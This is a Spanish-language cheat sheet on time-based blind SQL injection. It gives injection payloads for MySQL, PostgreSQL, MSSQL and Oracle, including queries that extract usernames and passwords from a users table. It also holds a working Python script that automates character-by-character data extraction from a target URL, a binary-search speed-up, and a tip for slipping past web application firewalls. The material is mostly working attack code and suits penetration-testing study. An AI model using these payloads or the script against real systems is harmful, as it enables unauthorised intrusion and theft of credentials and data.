# Blind SQLi - Time-Based

Se utiliza cuando no hay ninguna diferencia visible en la respuesta (ni en el contenido, ni en el código HTTP, ni en la longitud). La información se extrae midiendo el tiempo de respuesta del servidor.

Si la condición es TRUE el servidor tarda X segundos (sleep) Si la condición es FALSE el servidor responde inmediatamente

### Confirmar vulnerabilidad

```sql
-- MySQL
' AND SLEEP(5) -- -                         → retraso de 5s = vulnerable

-- PostgreSQL
' AND pg_sleep(5) -- -
'; SELECT pg_sleep(5) -- -

-- MSSQL
'; WAITFOR DELAY '0:0:5' -- -
' AND 1=1; WAITFOR DELAY '0:0:5' -- -

-- Oracle
' AND 1=1 AND dbms_pipe.receive_message(('a'),5)=1 -- -
' OR 1=1 AND (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<=1 AND 1=(SELECT 1 FROM dual WHERE dbms_pipe.receive_message('x',5)=1))=1 -- -
```

> Empezar con 5 segundos. Valores muy altos pueden causar timeout en el servidor.

### Extracción condicional con sleep

La clave es combinar `IF/CASE` con la función de sleep para crear una condición temporal:

```
Condición TRUE  → SLEEP(5) → respuesta tarda 5s
Condición FALSE → SLEEP(0) → respuesta inmediata
```

### MySQL - Payloads

#### Estructura base con IF()

```sql
-- Si la condición es TRUE → sleep(5), si no → sleep(0)
' AND IF([CONDICION], SLEEP(5), 0) -- -
```

#### Confirmar base de datos

```sql
-- ¿La longitud de database() es mayor que 5?
' AND IF(length(database())>5, SLEEP(5), 0) -- -

-- ¿El primer carácter de database() tiene ASCII > 96?
' AND IF(ascii(substring(database(),1,1))>96, SLEEP(5), 0) -- -

-- ¿Es exactamente 'm' (109)?
' AND IF(ascii(substring(database(),1,1))=109, SLEEP(5), 0) -- -
```

#### Extraer tabla

```sql
' AND IF(ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>96, SLEEP(5), 0) -- -
```

#### Extraer datos de usuarios

```sql
' AND IF(ascii(substring((SELECT username FROM users LIMIT 0,1),1,1))>96, SLEEP(5), 0) -- -
' AND IF(ascii(substring((SELECT password FROM users LIMIT 0,1),1,1))>96, SLEEP(5), 0) -- -
```

### PostgreSQL - Payloads

```sql
-- Estructura base con CASE
' AND (CASE WHEN ([CONDICION]) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL -- -

-- Versión
' AND (CASE WHEN (ascii(substring(version(),1,1))>96) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL -- -

-- Base de datos
' AND (CASE WHEN (ascii(substring(current_database(),1,1))>96) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL -- -

-- Tablas
' AND (CASE WHEN (ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=current_database() LIMIT 1),1,1))>96) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL -- -
```

### MSSQL - Payloads

```sql
-- Estructura base con IF
'; IF ([CONDICION]) WAITFOR DELAY '0:0:5' -- -

-- Base de datos
'; IF (ascii(substring(db_name(),1,1))>96) WAITFOR DELAY '0:0:5' -- -

-- Tablas
'; IF (ascii(substring((SELECT TOP 1 table_name FROM information_schema.tables),1,1))>96) WAITFOR DELAY '0:0:5' -- -

-- Datos
'; IF (ascii(substring((SELECT TOP 1 username FROM users),1,1))>96) WAITFOR DELAY '0:0:5' -- -
```

### Oracle - Payloads

```sql
-- dbms_pipe.receive_message (requiere privilegios de DBA a veces)
' AND (CASE WHEN ([CONDICION]) THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END)=1 -- -

-- Alternativa con CTXSYS (menos estable)
' AND (CASE WHEN (ascii(substr((SELECT ora_database_name FROM dual),1,1))>96) THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END)=1 -- -
```

### Script Python básico

```python
import requests
import time
import string

url = "https://target.com/item"
SLEEP_TIME = 5
THRESHOLD = 3  # Si la respuesta tarda > 3s, consideramos TRUE

def is_true(payload):
    start = time.time()
    requests.get(url, params={"id": payload})
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def get_length(query):
    for length in range(1, 50):
        payload = f"1 AND IF(length(({query}))={length}, SLEEP({SLEEP_TIME}), 0)-- -"
        if is_true(payload):
            print(f"[+] Length: {length}")
            return length
    return 0

def extract_string(query, length):
    result = ""
    chars = string.printable
    for i in range(1, length + 1):
        for char in chars:
            ascii_val = ord(char)
            payload = f"1 AND IF(ascii(substring(({query}),{i},1))={ascii_val}, SLEEP({SLEEP_TIME}), 0)-- -"
            if is_true(payload):
                result += char
                print(f"[+] Char {i}: {char} → {result}")
                break
    return result

# Extraer base de datos
query = "SELECT database()"
length = get_length(query)
db = extract_string(query, length)
print(f"\n[+] Database: {db}")
```

### Optimización: Bisección binaria

```python
def extract_char_binary(query, position):
    low, high = 32, 126  # Rango ASCII printable
    while low <= high:
        mid = (low + high) // 2
        payload = f"1 AND IF(ascii(substring(({query}),{position},1))>{mid}, SLEEP({SLEEP_TIME}), 0)-- -"
        if is_true(payload):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)
```

> Con bisección se pasa de \~95 peticiones/carácter a \~7 peticiones/carácter.

### Tips

> La red puede añadir latencia falsa. Ejecutar el script desde una red estable o usar un umbral dinámico (media de varias peticiones normales + N segundos).

> Si el servidor tiene múltiples workers, el sleep puede ejecutarse en paralelo. Mejor usar valores de sleep más altos (8-10s) para distinguir claramente.

> En entornos con WAF, el `SLEEP` puede estar bloqueado. Alternativas: `BENCHMARK(10000000,sha1(1))` en MySQL, que consume CPU en lugar de tiempo de espera.

```sql
-- BENCHMARK como alternativa a SLEEP (MySQL)
' AND IF(1=1, BENCHMARK(10000000, sha1(1)), 0) -- -
```

> sqlmap maneja todo esto automáticamente con `--technique=T`. Ideal para confirmación rápida.
